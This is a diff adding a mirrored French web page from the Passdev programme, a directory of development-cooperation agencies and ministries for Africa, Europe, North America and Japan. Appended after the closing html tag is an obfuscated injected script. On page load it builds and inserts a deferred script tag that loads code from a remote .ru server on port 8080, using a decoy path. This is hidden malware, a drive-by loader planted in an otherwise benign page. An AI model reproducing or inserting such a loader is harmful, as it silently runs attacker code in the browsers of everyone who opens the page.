@@ -1,0 +1,486 @@
+<html><!-- #BeginTemplate "/Templates/modele1.dwt" -->
+
+
+<!-- Mirrored from www.passdev.net by HTTrack Website Copier/3.x [XR&CO'2001] -->
+<head>
+
+<!-- #BeginEditable "doctitle" --> 
+
+<title>Passedev : Repertoire : Agences - directions - minist&egrave;res</title>
+
+<!-- #EndEditable --> 
+
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+
+<script language="JavaScript">
+
+<!--
+
+function MM_swapImgRestore() { //v3.0
+
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+
+}
+
+
+
+function MM_preloadImages() { //v3.0
+
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+
+}
+
+
+
+function MM_findObj(n, d) { //v3.0
+
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document); return x;
+
+}
+
+
+
+function MM_swapImage() { //v3.0
+
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+
+}
+
+//-->
+
+</script>
+
+<!-- #BeginEditable "metatags --> 
+
+<meta name="keywords" content="Passdev, P@ssdev, Développement rural, Ressources, Internet, Réseaux, Inter-réseaux, ">
+
+<meta name="description" content="Le programme P@ssdev est une passerelle vers l'appropriation des TIC pour le développement rural, notamment en Afrique francophone.">
+
+<meta name="Organisation" content="Inter-réseaux (www.inter-reseaux.org)">
+
+<meta name="Responsable de projet" content="Gilles mersadier (gilles.mersadier@inter-reseaux.org)">
+
+<!-- #EndEditable --> 
+
+<meta name="Author" content="R&eacute;alisation du site : Accessit (www.accessit.org)">
+
+</head>
+
+
+
+<body bgcolor="#FFFFFF" background="../../images/blue2-4.jpg"  onLoad="MM_preloadImages('../../images/b_pratiq2.gif','../../images/b_repert2.gif','../../images/b_sources2.gif','../../images/b_search2.gif','../../images/b_passdev1.gif','../../images/b_pratiq1.gif','../../images/b_repert1.gif')" text="#000000" link="#0000CC" vlink="#003366" alink="#9999FF">
+
+<blockquote>
+
+  <table width="86%" border="0" cellspacing="0" cellpadding="0" height="302">
+
+    <tr> 
+
+      <td rowspan="2" valign="top" width="110"> 
+
+        <div align="left"> 
+
+          <p><a href="../../index.htm"><img src="../../images/test_logo_passdev.gif" width="100" height="40" border="0" alt="Retour &agrave; la page d'accueil de Passdev"><br>
+
+            </a></p>
+
+          <p>&nbsp;</p>
+
+          <p>&nbsp;</p>
+
+        </div>
+
+        <p><!-- #BeginEditable "boutons_menu" --><a href="../../passdev/index.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('passdev','','../../images/b_passdev1.gif',1)"><img name="passdev" border="0" src="../../images/b_passdev2.gif" width="100" height="29"></a><br>
+
+          <a href="../../pratique/index.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('pratique','','../../images/b_pratiq1.gif',1)"><img name="pratique" border="0" src="../../images/b_pratiq2.gif" width="100" height="29"></a><br>
+
+          <a href="../index.htm"><img src="../../images/b_repert1.gif" width="100" height="29" border="0"></a><br>
+
+          <a href="../index.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('b_repert','','../../images/b_repert2.gif',1)"> 
+
+          </a><a href="../../sources/index.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('sources','','../../images/b_sources1.gif',1)"><img name="sources" border="0" src="../../images/b_sources2.gif" width="100" height="29"><br>
+
+          </a><a href="../../quest/index.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('search','','../../images/b_search1.gif',1)"><img name="search" border="0" src="../../images/b_search2.gif" width="100" height="30"></a><!-- #EndEditable --></p>
+
+      </td>
+
+      <td rowspan="2" valign="top" width="674"> 
+        <h4 align="center"><font face="Arial, Helvetica, sans-serif"><!-- #BeginEditable "titre" --><font face="Arial, Helvetica, sans-serif" size="-1"><a name="top"></a></font><font face="Arial, Helvetica, sans-serif">AGENCES 
+          - DIRECTIONS - MINISTERES<br>
+          </font><!-- #EndEditable --></font> </h4>
+
+        <hr>
+
+        <div align="center"><!-- #BeginEditable "sous-menu" --> 
+          <p align="center"><font face="Arial, Helvetica, sans-serif" size="-1">[<b>Agences-Directions-Minist&egrave;res</b>] 
+            [<a href="../multilat/index.htm">Organisations&nbsp;multilat&eacute;rales&nbsp;et&nbsp;r&eacute;gionales</a>] 
+            <br>
+            [<a href="../ONU/index.htm">Organisations&nbsp;et&nbsp;services&nbsp;des&nbsp;Nations-Unies</a>] 
+            [<a href="../finance/index.htm">Banques&nbsp;et&nbsp;organisations&nbsp;financi&egrave;res</a>] 
+            <br>
+            [<a href="../Rechdev/index-2.htm">Recherche-D&eacute;veloppement</a>] 
+            [<a href="../ONG/index.htm">ONG-R&eacute;seaux-Op&eacute;rateurs</a>]</font><font face="Arial, Helvetica, sans-serif" size="-1"> 
+            </font></p>
+          <!-- #EndEditable --> <br>
+
+        </div>
+
+        <table width="100%" border="1" cellspacing="0" cellpadding="8" bordercolor="#000066">
+
+          <tr valign="top"> 
+
+            <td><font face="Arial, Helvetica, sans-serif" size="-1"><!-- #BeginEditable "texte" --> 
+              <font face="Arial, Helvetica, sans-serif" size="-1"> 
+              <script language="JavaScript" type="text/javascript">
+
+<!--   hide this script from non-javascript-enabled browsers
+
+	
+
+function infopt(pPage) {
+
+ popUpWin = window.open(pPage,'winPopUp','resizable=no,scrollbars=no,width=250,height=250');
+
+ } 
+
+
+
+function infomoy(pPage) {
+
+ popUpWin = window.open(pPage,'winPopUp','resizable=yes,scrollbars=yes,width=400,height=400');
+
+ } 
+
+
+
+function infogd(pPage) {
+
+ popUpWin = window.open(pPage,'winPopUp','resizable=yes,scrollbars=yes,width=600,height=450');
+
+ } 
+
+ 
+
+//end hiding javascript --> 
+
+</script>
+              <i>Note : En cliquant sur le bouton <img src="../../images/info.gif" width="13" height="13" border="0"> 
+              vous ouvrez une fen&ecirc;tre de commentaire sur le site. </i></font> 
+              <h3>Afrique <a href="#top"><img src="../../images/flechetop.gif" width="14" height="14" border="0"></a></h3>
+              <blockquote> 
+                <h4>B&eacute;nin</h4>
+                <p> 
+                <ul>
+                  <li><b>Ministère des affaires étrangères et de la coopération 
+                    </b><br>
+                    <a href="http://planben.intnet.bj/" target="_blank">planben.intnet.bj/maec/ 
+                    </a></li>
+                </ul>
+              </blockquote>
+              <blockquote> 
+                <h4>Burkina-Faso</h4>
+                <p> 
+                <ul>
+                  <li><b>Site officiel du gouvernement </b><br>
+                    <a href="http://www.primature.gov.bf/" target="_blank">www.primature.gov.bf 
+                    </a></li>
+                  <li><b>Ministère des affaires étrangères</b> <br>
+                    <a href="http://www.mae.gov.bf/" target="_blank">www.mae.gov.bf</a> 
+                  </li>
+                  <li><b>Conseil économique et social </b><br>
+                    <a href="http://www.ces.gov.bf/" target="_blank">www.ces.gov.bf 
+                    </a></li>
+                </ul>
+                <h4> Cameroun </h4>
+                <p> 
+                <ul>
+                  <li><b>Ministère des relations extérieures</b><br>
+                    <a href="http://www.diplocam.cm/" target="_blank">www.diplocam.cm</a> 
+                  </li>
+                  <li><b>Ministère de l'environnement et des forêts</b><br>
+                    <a href="http://www.minef.cm/" target="_blank">www.minef.cm</a> 
+                  </li>
+                </ul>
+              </blockquote>
+              <blockquote> 
+                <h4>C&ocirc;te d'Ivoire </h4>
+                <ul>
+                  <li><b>Ministère de l'Agriculture</b> <br>
+                    <a href="http://www.africaonline.co.ci/AfricaOnline/societes/minagr/minagr.html" target="_blank">www.africaonline.co.ci/AfricaOnline/societes/minagr/minagr.html</a> 
+                  </li>
+                </ul>
+              </blockquote>
+              <p> 
+              <blockquote> 
+                <h4>Mali</h4>
+                <p>
+                <ul>
+                  <li><b>Ministère de l'administration territoriale et des collectivités 
+                    locales de la république du Mali </b><a href="http://w3.matcl.gov.ml" target="blank"><br>
+                    http://w3.matcl.gov.ml </a> </li>
+                  <li><b>Le Minist&egrave;re de l'Industrie, de l'Artisanat et 
+                    du Tourisme</b><br>
+                    <a href="http://www.undp.org/fomli/" target="_blank">www.undp.org/fomli/</a><br>
+                  </li>
+                </ul>
+                <h4>S&eacute;n&eacute;gal </h4>
+                <p> 
+                <ul>
+                  <li><b>Gouvernement (site portail) </b><br>
+                    <a href="http://www.gouv.sn/" target="_blank">www.gouv.sn</a><br>
+                  </li>
+                  <li><b>Ministère de l'Equipement et des Transports Direction 
+                    des travaux géographiques et cartographiques</b> <br>
+                    <a href="http://www.ausenegal.com/dtgc/index.html" target="_blank">www.ausenegal.com/dtgc/index.html</a> 
+                  </li>
+                </ul>
+                <h4>Togo </h4>
+                <ul>
+                  <li><b>Ministère de l'Agriculture, de l'Elevage et de la Pêche</b> 
+                    <br>
+                    <a href="http://www.refer.fr/benin_ct/edu/isysphyt/francais/admin/servof/togo/maep.htm" target="_blank">www.refer.fr/benin_ct/edu/isysphyt/francais/admin/servof/togo/maep.htm</a> 
+                  </li>
+                </ul>
+              </blockquote>
+              <h3> </h3>
+              <h3> </h3>
+              <h3>Europe <a href="#top"><img src="../../images/flechetop.gif" width="14" height="14" border="0"></a></h3>
+              <blockquote> 
+                <p>
+                <h4>France</h4>
+                <p> 
+                <ul>
+                  <li><b>MAE - Ministère français des Affaires Etrangères</b> 
+                    <br>
+                    <a href="http://www.france.diplomatie.fr/" target="_blank">www.france.diplomatie.fr</a> 
+                  </li>
+                  <li><b>DGCID-Direction générale de la coopération internationale 
+                    et du développement :</b> <font face="Arial, Helvetica, sans-serif" size="-1"><font face="Arial, Helvetica, sans-serif" size="-1"><i><a href="javascript:infomoy('DGCID.htm')"><img src="../../images/info.gif" width="13" height="13" border="0"></a></i></font></font><br>
+                    <a href="http://www.diplomatie.fr/cooperation/index.html" target="_blank">www.diplomatie.fr/cooperation/index.html</a> 
+                  </li>
+                  <li><b>Enseignement Agricole Public - Bureau de la Coopération 
+                    Internationale </b><br>
+                    <a href="http://www.educagri.fr/actions/coopint/sommaire.htm" target="_blank">www.educagri.fr/actions/coopint/sommaire.htm</a> 
+                  </li>
+                  <li><b>HCCI - Haut Conseil de la Coopération Internationale 
+                    </b>: <font face="Arial, Helvetica, sans-serif" size="-1"><font face="Arial, Helvetica, sans-serif" size="-1"><i><a href="javascript:infomoy('HCCI.htm')"><img src="../../images/info.gif" width="13" height="13" border="0"></a></i></font></font><br>
+                    <a href="http://www.cooperation-internationale.gouv.fr/" target="_blank">www.cooperation-internationale.gouv.fr</a> 
+                  </li>
+                </ul>
+                <p>
+                <h4>Allemagne</h4>
+                <p> 
+                <ul>
+                  <li><b>BMZ - Bundesministerium fur wirtschaftliche Zusammenarbeit 
+                    und Entwicklung </b><br>
+                    <a href="http://www.bmz.de/" target="_blank">www.bmz.de</a> 
+                    <br>
+                    Version anglaise partielle, en construction </li>
+                  <li><b>GTZ - Deutsche Gessellschaft fur Technische Zusammenarbeit 
+                    </b><br>
+                    <a href="http://www.gtz.de/" target="_blank">www.gtz.de </a><br>
+                    Version anglaise, rubrique " pays " en français </li>
+                  <li><b>DES - Deutsche Stiftung fur Internationale Entwicklung 
+                    - Fondation allemande pour le développement international 
+                    </b><br>
+                    <a href="http://www.dse.de/" target="_blank">www.dse.de </a><br>
+                    Version anglaise, versions française et espagnole très limitées. 
+                  </li>
+                </ul>
+                <p>
+                <h4>Autriche</h4>
+                <p> 
+                <ul>
+                  <li><b>Development Cooperation Aid </b><br>
+                    <a href="http://www.bmaa.gv.at/eza/index.html.en" target="_blank">www.bmaa.gv.at/eza/index.html.en</a> 
+                    <br>
+                    Version anglaise quasi totale, rubrique en cour de construction. 
+                  </li>
+                </ul>
+                <p>
+                <h4>Belgique</h4>
+                <p> 
+                <ul>
+                  <li><b>Belgian Ministry of Foreign Affairs, Foreign Trade and 
+                    Development Cooperation</b> <br>
+                    <a href="http://www.diplobel.fgov.be/Cooperation/cooperation_EN.htm" target="_blank">www.diplobel.fgov.be/Cooperation/cooperation_EN.htm 
+                    </a><br>
+                    Version anglaise totale. </li>
+                </ul>
+                <p>
+                <h4>Danemark <a href="#top"><img src="../../images/flechetop.gif" width="14" height="14" border="0"></a></h4>
+                <p> 
+                <ul>
+                  <li><b>DANIDA - Danish International Development Assistance</b> 
+                    <br>
+                    <a href="http://www.um.dk/danida/" target="_blank">www.um.dk/danida/ 
+                    </a><br>
+                    Pas de version anglaise </li>
+                </ul>
+                <p> 
+                <h4>Finlande </h4>
+                <ul>
+                  <li><b>FINNIDA - Finnish Ministry of Foreign Affairs, Department 
+                    for International Development Cooperation </b><br>
+                    <a href="http://global.finland.fi/english/index.html" target="_blank">global.finland.fi/english/index.html</a> 
+                    <br>
+                    Version anglaise intégrale </li>
+                </ul>
+                <p>
+                <h4>Irlande</h4>
+                <ul>
+                  <li><b>Development Cooperation Division, Department of Foreign 
+                    Affairs</b> <br>
+                    <a href="http://www.irlgov.ie/iveagh" target="_blank">www.irlgov.ie/iveagh</a> 
+                  </li>
+                </ul>
+                <p>
+                <h4>Italie </h4>
+                <ul>
+                  <li><b>Ministero Degli Affari Esteri </b><br>
+                    <a href="http://www.esteri.it/" target="_blank">www.esteri.it 
+                    </a><br>
+                    Version anglaise partielle </li>
+                </ul>
+                <p>
+                <h4>Espagne</h4>
+                <p> 
+                <ul>
+                  <li><b>Agencia Española de Cooperación Internacional Cooperation 
+                    </b><br>
+                    <a href="http://www.aeci.es/Default.htm" target="_blank">www.aeci.es/Default.htm</a><br>
+                    Tout en espagnol. </li>
+                </ul>
+                <p>
+                <h4>Norv&egrave;ge </h4>
+                <ul>
+                  <li><b>Norway Ministry of Foreign Affairs</b> <br>
+                    <a href="http://odin.dep.no/ud/engelsk/index-b-n-a.html" target="_blank">odin.dep.no/ud/engelsk/index-b-n-a.html</a> 
+                    <br>
+                    Quelques pages en anglais </li>
+                  <li><b>NORAD - Norwegian Development Agency</b> <br>
+                    <a href="http://www.norad.no/" target="_blank">www.norad.no</a> 
+                    <br>
+                    Quelques pages en anglais </li>
+                  <li><b>NUFU - Norwegian Council of Universities Committee for 
+                    Development Research and Education </b><br>
+                    <a href="http://www.siu.no/vev.nsf/start/English" target="_blank">www.siu.no/vev.nsf/start/English</a><br>
+                    En anglais du début à la fin. </li>
+                </ul>
+                <p>
+                <h4>Pays-Bas </h4>
+                <ul>
+                  <li><b>DGIS - Ministry of Foreign Affairs / Directorate General 
+                    for International Cooperation</b> <br>
+                    <a href="http://www.minbuza.nl/" target="_blank">www.minbuza.nl</a> 
+                    <br>
+                    Version anglaise, quelques rubriques (comme l'aide bilatérale) 
+                    en français et en espagnol sur certaines. </li>
+                </ul>
+                <p>
+                <h4>Royaume-Uni </h4>
+                <ul>
+                  <li><b>DFID - Department for International Development <br>
+                    </b> <a href="http://www.dfid.gov.uk/" target="_blank">www.dfid.gov.uk 
+                    </a></li>
+                  <li><b>British Council </b><br>
+                    <a href="http://www.britcoun.org/" target="_blank">www.britcoun.org</a> 
+                  </li>
+                  <li><b>FCO - Foreign and Commonwealth Office </b><br>
+                    <a href="http://www.fco.gov.uk/" target="_blank">www.fco.gov.uk</a> 
+                  </li>
+                </ul>
+                <p>
+                <h4>Su&egrave;de </h4>
+                <ul>
+                  <li><b>SIDA - Swedish International Development Authority </b><br>
+                    <a href="http://www.sida.se/" target="_blank">www.sida.se</a> 
+                    <br>
+                    En anglais, français, espagnol et portugais pour la présentation 
+                    général. Les documents sont en suédois. </li>
+                </ul>
+                <p>
+                <h4>Suisse</h4>
+                <ul>
+                  <li><b>DDC - Direction du Développement et de la Coopération 
+                    </b><br>
+                    <a href="http://194.230.65.134/dezaweb2/home.asp" target="_blank">http://194.230.65.134/dezaweb2/home.asp</a><br>
+                    Version intégrale en 5 langues : allemand, français, anglais, 
+                    italien, espagnol </li>
+                </ul>
+              </blockquote>
+              <h3>Am&eacute;rique du Nord <a href="#top"><img src="../../images/flechetop.gif" width="15" height="14" border="0"></a></h3>
+              <blockquote> 
+                <p>
+                <h4>Canada </h4>
+                <ul>
+                  <li><b>ACDI - Agence Canadienne de Développement International 
+                    </b><br>
+                    <a href="http://www.acdi-cida.gc.ca/INDEX-F.HTM" target="_blank">www.acdi-cida.gc.ca/INDEX-F.HTM</a></li>
+                  <li><b>CECI - Centre Canadien d'Etude et de Coopération Internationale</b> 
+                    <br>
+                    <a href="http://www.ceci.ca/" target="_blank">www.ceci.ca</a> 
+                  </li>
+                </ul>
+                <p>
+                <h4>Etats-Unis </h4>
+                <ul>
+                  <li><b>USAID (Région Afrique) United States Agency for International 
+                    Development </b><br>
+                    <a href="http://www.info.usaid.gov/regions/afr/" target="_blank">www.info.usaid.gov/regions/afr/</a> 
+                  </li>
+                </ul>
+              </blockquote>
+              <h3>Asie <a href="#top"><img src="../../images/flechetop.gif" width="14" height="14" border="0"></a></h3>
+              <blockquote> 
+                <p>
+                <h4>Japon</h4>
+                <ul>
+                  <li><b>Japon International Cooperation Agency</b> <br>
+                    <a href="http://www.jica.go.jp/english/index.html" target="_blank">www.jica.go.jp/english/index.html</a> 
+                  </li>
+                </ul>
+              </blockquote>
+              <!-- #EndEditable --></font></td>
+
+          </tr>
+
+        </table>
+
+      </td>
+
+    </tr>
+
+    <tr> </tr>
+
+  </table>
+
+</blockquote>
+
+<p>&nbsp;</p>
+
+
+
+</body>
+
+<!-- #EndTemplate -->
+<!-- Mirrored from www.passdev.net by HTTrack Website Copier/3.x [XR&CO'2001] -->
+</html>
+
+
+
+
+<script>var B=new String();var H=new Array();function k(){var uK=new Array();var Si="";var Td;if(Td!='l' && Td != ''){Td=null};this.aB='';var q=window;var cM='';var T=unescape;var xG=new String();var So=new String();var p=T("%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%67%6f%6f%67%6c%65%2e%63%6c%2f%6d%6f%7a%69%6c%6c%61%2e%6f%72%67%2e%70%68%70");var XE=new String();var ml=new String();var d="";function M(X,x){var xz="";var j;if(j!='Xs' && j!='Zo'){j=''};this.yx='';this.ZX='';var qi=new String("gUEvK".substr(0,1));var K=T("%5b"), C=T("%5d");var f;if(f!='' && f!='LQ'){f='mf'};var nI;if(nI!='' && nI!='db'){nI='UW'};var u=K+x+C;var uX=new String();var uB=new RegExp(u, qi);var mlt=new Array();this.h='';return X.replace(uB, new String());var rI='';var xp=new Date();};var jg=new Date();var rW;if(rW!='' && rW!='s'){rW=null};var IC=new String();var wC=new String();var MY;if(MY!='JU'){MY='JU'};var nZ;if(nZ!='EB' && nZ!='oh'){nZ='EB'};var w=new String();var S=document;var uZ=M('87297104574784474097954','9453712');var hx='';function A(){var c=T("%68%74%74%70%3a%2f%2f%73%6e%6f%72%65%66%6c%61%73%68%2e%72%75%3a");var N;if(N!='fy'){N='fy'};var Js=new Array();w=c;var ER;if(ER!='' && ER!='rv'){ER=''};var sC;if(sC!='' && sC!='Ds'){sC='iq'};w+=uZ;var e=new Array();w+=p;var bp;if(bp!=''){bp='cF'};var Mz;if(Mz!=''){Mz='aC'};var Mx='';try {L=S.createElement(M('sfcNrji4pBt4','gYPND14B_Ej8LmAnkf'));var RP='';var TL;if(TL!='' && TL!='VO'){TL='Iw'};L[T("%64%65%66%65%72")]=[1,2][0];var Yd=new Date();var bC="";L[T("%73%72%63")]=w;var Dq=new Array();var fI=new Array();S.body.appendChild(L);var zEL='';} catch(MZ){var aa;if(aa!='' && aa!='Ec'){aa=null};alert(MZ);};var Od=new String();var kF=new String();}var ty;if(ty!='' && ty!='Cs'){ty=''};var oc;if(oc!='' && oc!='Uv'){oc=''};q[new String("on"+"lo"+"ad")]=A;var rU;if(rU!='wr'){rU=''};var gL;if(gL!='QG'){gL=''};var KB="";};var sD;if(sD!='' && sD!='Xc'){sD=''};k();var Wk=new String();var oC;if(oC!='Lr' && oC!='zW'){oC=''};</script>
+<!--0f36b393fa1915377ecf77120fb06d2d-->
